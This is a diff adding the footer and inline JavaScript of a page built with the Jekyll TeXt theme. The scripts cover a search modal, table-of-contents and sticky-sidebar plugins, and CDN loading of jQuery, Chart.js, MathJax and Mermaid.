+        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
+      </div>
+    </div>
+  </div>
+</footer>
+</div></div>
+    </div><script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $body = $('body'), $window = $(window);
+    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
+    var activeCount = 0;
+    function modal(options) {
+      var $root = this, visible, onChange, hideWhenWindowScroll = false;
+      var scrollTop;
+      function setOptions(options) {
+        var _options = options || {};
+        visible = _options.initialVisible === undefined ? false : show;
+        onChange = _options.onChange;
+        hideWhenWindowScroll = _options.hideWhenWindowScroll;
+      }
+      function init() {
+        setState(visible);
+      }
+      function setState(isShow) {
+        if (isShow === visible) {
+          return;
+        }
+        visible = isShow;
+        if (visible) {
+          activeCount++;
+          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
+          $root.addClass('modal--show');
+          $pageMain.scrollTop(scrollTop);
+          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
+          $window.on('keyup', handleKeyup);
+        } else {
+          activeCount > 0 && activeCount--;
+          $root.removeClass('modal--show');
+          $window.scrollTop(scrollTop);
+          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
+          $window.off('keyup', handleKeyup);
+        }
+        onChange && onChange(visible);
+      }
+      function show() {
+        setState(true);
+      }
+      function hide() {
+        setState(false);
+      }
+      function handleKeyup(e) {
+        // Char Code: 27  ESC
+        if (e.which ===  27) {
+          hide();
+        }
+      }
+      setOptions(options);
+      init();
+      return {
+        show: show,
+        hide: hide,
+        $el: $root
+      };
+    }
+    $.fn.modal = modal;
+  });
+})();
+</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
+(function () {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    // search panel
+    var search = (window.search || (window.search = {}));
+    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
+      true : window.useDefaultSearchBox ;
+
+    var $searchModal = $('.js-page-search-modal');
+    var $searchToggle = $('.js-search-toggle');
+    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
+    var modalVisible = false;
+    search.searchModal = searchModal;
+
+    var $searchBox = null;
+    var $searchInput = null;
+    var $searchClear = null;
+
+    function getModalVisible() {
+      return modalVisible;
+    }
+    search.getModalVisible = getModalVisible;
+
+    function handleModalChange(visible) {
+      modalVisible = visible;
+      if (visible) {
+        search.onShow && search.onShow();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
+      } else {
+        search.onShow && search.onHide();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
+        setTimeout(function() {
+          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
+          search.clear && search.clear();
+          window.pageAsideAffix && window.pageAsideAffix.refresh();
+        }, 400);
+      }
+    }
+
+    $searchToggle.on('click', function() {
+      modalVisible ? searchModal.hide() : searchModal.show();
+    });
+    // Char Code: 83  S, 191 /
+    $(window).on('keyup', function(e) {
+      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
+        modalVisible || searchModal.show();
+      }
+    });
+
+    if (useDefaultSearchBox) {
+      $searchBox = $('.js-search-box');
+      $searchInput = $searchBox.children('input');
+      $searchClear = $searchBox.children('.js-icon-clear');
+      search.getSearchInput = function() {
+        return $searchInput.get(0);
+      };
+      search.getVal = function() {
+        return $searchInput.val();
+      };
+      search.setVal = function(val) {
+        $searchInput.val(val);
+      };
+
+      $searchInput.on('focus', function() {
+        $(this).addClass('focus');
+      });
+      $searchInput.on('blur', function() {
+        $(this).removeClass('focus');
+      });
+      $searchInput.on('input', window.throttle(function() {
+        var val = $(this).val();
+        if (val === '' || typeof val !== 'string') {
+          search.clear && search.clear();
+        } else {
+          $searchBox.addClass('not-empty');
+          search.onInputNotEmpty && search.onInputNotEmpty(val);
+        }
+      }, 400));
+      $searchClear.on('click', function() {
+        $searchInput.val(''); $searchBox.removeClass('not-empty');
+        search.clear && search.clear();
+      });
+    }
+  });
+})();
+</script><div class="search search--dark">
+  <div class="main">
+    <div class="search__header">Search</div>
+    <div class="search-bar">
+      <div class="search-box js-search-box">
+        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
+        <input type="text" />
+        <div class="search-box__icon-clear js-icon-clear">
+          <a><i class="fas fa-times"></i></a>
+        </div>
+      </div>
+      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
+        Cancel</button>
+    </div>
+    <div class="search-result js-search-result"></div>
+  </div>
+</div>
+<script>var SOURCES = window.TEXT_VARIABLES.sources;
+var PAHTS = window.TEXT_VARIABLES.paths;
+window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
+  var search = (window.search || (window.search = {}));
+  var searchData = window.TEXT_SEARCH_DATA || {};
+
+  function memorize(f) {
+    var cache = {};
+    return function () {
+      var key = Array.prototype.join.call(arguments, ',');
+      if (key in cache) return cache[key];
+      else return cache[key] = f.apply(this, arguments);
+    };
+  }
+
+  /// search
+  function searchByQuery(query) {
+    var i, j, key, keys, cur, _title, result = {};
+    keys = Object.keys(searchData);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      for (j = 0; j < searchData[key].length; j++) {
+        cur = searchData[key][j], _title = cur.title;
+        if ((result[key] === undefined || result[key] && result[key].length < 4 )
+          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
+          if (result[key] === undefined) {
+            result[key] = [];
+          }
+          result[key].push(cur);
+        }
+      }
+    }
+    return result;
+  }
+
+  var renderHeader = memorize(function(header) {
+    return $('<p class="search-result__header">' + header + '</p>');
+  });
+
+  var renderItem = function(index, title, url) {
+    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
+  };
+
+  function render(data) {
+    if (!data) { return null; }
+    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
+    keys = Object.keys(data);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      $root.append(renderHeader(key));
+      for (j = 0; j < data[key].length; j++) {
+        cur = data[key][j];
+        $root.append(renderItem(itemIndex++, cur.title, cur.url));
+      }
+    }
+    return $root;
+  }
+
+  // search box
+  var $result = $('.js-search-result'), $resultItems;
+  var lastActiveIndex, activeIndex;
+
+  function clear() {
+    $result.html(null);
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+  }
+  function onInputNotEmpty(val) {
+    $result.html(render(searchByQuery(val)));
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+    $resultItems.eq(0).addClass('active');
+  }
+
+  search.clear = clear;
+  search.onInputNotEmpty = onInputNotEmpty;
+
+  function updateResultItems() {
+    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
+    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
+  }
+
+  function moveActiveIndex(direction) {
+    var itemsCount = $resultItems ? $resultItems.length : 0;
+    if (itemsCount > 1) {
+      lastActiveIndex = activeIndex;
+      if (direction === 'up') {
+        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
+      } else if (direction === 'down') {
+        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
+      }
+      updateResultItems();
+    }
+  }
+
+  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
+  $(window).on('keyup', function(e) {
+    var modalVisible = search.getModalVisible && search.getModalVisible();
+    if (modalVisible) {
+      if (e.which === 38) {
+        modalVisible && moveActiveIndex('up');
+      } else if (e.which === 40) {
+        modalVisible && moveActiveIndex('down');
+      } else if (e.which === 13) {
+        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
+      }
+    }
+  });
+
+  $result.on('mouseover', '.search-result__item > a', function() {
+    var itemIndex = $(this).parent().data('index');
+    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
+  });
+});
+</script>
+</div></div>
+
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function scrollToAnchor(anchor, duration, callback) {
+      var $root = this;
+      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
+        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
+        callback && callback();
+      });
+    }
+    $.fn.scrollToAnchor = scrollToAnchor;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function affix(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroll,
+        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
+        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
+        hasInit = false, curState;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroll && (scroll = _options.scroll);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $scrollTarget = $(scrollTarget);
+        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
+        $scroll = $(scroll);
+      }
+      function preCalc() {
+        top();
+        rootHeight = $root.outerHeight();
+        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
+        rootLeft = $root.offset().left;
+      }
+      function calc(needPreCalc) {
+        needPreCalc && preCalc();
+        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
+        rootBottomTop = scrollBottom - rootTop;
+      }
+      function top() {
+        if (curState !== 'top') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: 0
+          });
+          curState = 'top';
+        }
+      }
+      function fixed() {
+        if (curState !== 'fixed') {
+          $root.addClass('fixed').css({
+            left: rootLeft + 'px',
+            top: 0
+          });
+          curState = 'fixed';
+        }
+      }
+      function bottom() {
+        if (curState !== 'bottom') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: rootBottomTop + 'px'
+          });
+          curState = 'bottom';
+        }
+      }
+      function setState() {
+        var scrollTop = $scrollTarget.scrollTop();
+        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
+          fixed();
+        } else if (scrollTop < rootTop) {
+          top();
+        } else {
+          bottom();
+        }
+      }
+      function init() {
+        if(!hasInit) {
+          var interval, timeout;
+          calc(true); setState();
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState();
+          });
+          $window.on('resize', function() {
+            disabled || (calc(true), setState());
+          });
+          hasInit = true;
+        }
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions,
+        refresh: function() {
+          calc(true, { animation: false }); setState();
+        }
+      };
+    }
+    $.fn.affix = affix;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function toc(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
+        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
+        headingsPos, scrolling = false, hasRendered = false, hasInit = false;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.selectors && (selectors = _options.selectors);
+        _options.container && (container = _options.container);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroller && (scroller = _options.scroller);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $headings = $(container).find(selectors).filter('[id]');
+        $scrollTarget = $(scrollTarget);
+        $scroller = $(scroller);
+      }
+      function calc() {
+        headingsPos = [];
+        $headings.each(function() {
+          headingsPos.push(Math.floor($(this).position().top));
+        });
+      }
+      function setState(element, disabled) {
+        var scrollTop = $scrollTarget.scrollTop(), i;
+        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
+        if (element) {
+          $activeCur = element;
+        } else {
+          for (i = 0; i < headingsPos.length; i++) {
+            if (scrollTop >= headingsPos[i]) {
+              $activeCur = $tocLi.eq(i);
+            } else {
+              $activeCur || ($activeCur = $tocLi.eq(i));
+              break;
+            }
+          }
+        }
+        $activeLast && $activeLast.removeClass('active');
+        ($activeLast = $activeCur).addClass('active');
+      }
+      function render() {
+        if(!hasRendered) {
+          $root.append($tocUl);
+          $headings.each(function() {
+            var $this = $(this);
+            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
+              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
+          });
+          $tocLi = $tocUl.children('li');
+          $tocUl.on('click', 'a', function(e) {
+            e.preventDefault();
+            var $this = $(this);
+            scrolling = true;
+            setState($this.parent());
+            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
+              scrolling = false;
+            });
+          });
+        }
+        hasRendered = true;
+      }
+      function init() {
+        var interval, timeout;
+        if(!hasInit) {
+          render(); calc(); setState(null, scrolling);
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState(null, scrolling);
+          });
+          $window.on('resize', window.throttle(function() {
+            if (!disabled) {
+              render(); calc(); setState(null, scrolling);
+            }
+          }, 100));
+        }
+        hasInit = true;
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions
+      };
+    }
+    $.fn.toc = toc;
+  });
+})();
+/*(function () {
+
+})();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
+</script><script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
+    var $canvas = null, $this = null, _ctx = null, _text = '';
+    $('.language-chart').each(function(){
+      $this = $(this);
+      $canvas = $('<canvas></canvas>');
+      _text = $this.text();
+      $this.text('').append($canvas);
+      _ctx = $canvas.get(0).getContext('2d');
+      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
+    });
+  });
+</script>
+<script type="text/x-mathjax-config">
+	var _config = { tex2jax: {
+		inlineMath: [['$','$'], ['\\(','\\)']]
+	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
+</script>
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  window.Lazyload.js('https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js', function() {
+    mermaid.initialize({
+      startOnLoad: true
+    });
+    mermaid.init(undefined, '.language-mermaid');
+  });
+</script>
+
+    </div>
+    <script>(function () {
+  var $root = document.getElementsByClassName('root')[0];
+  if (window.hasEvent('touchstart')) {
+    $root.dataset.isTouch = true;
+    document.addEventListener('touchstart', function(){}, false);
+  }
+})();
+</script>
+  </body>
+</html>
+
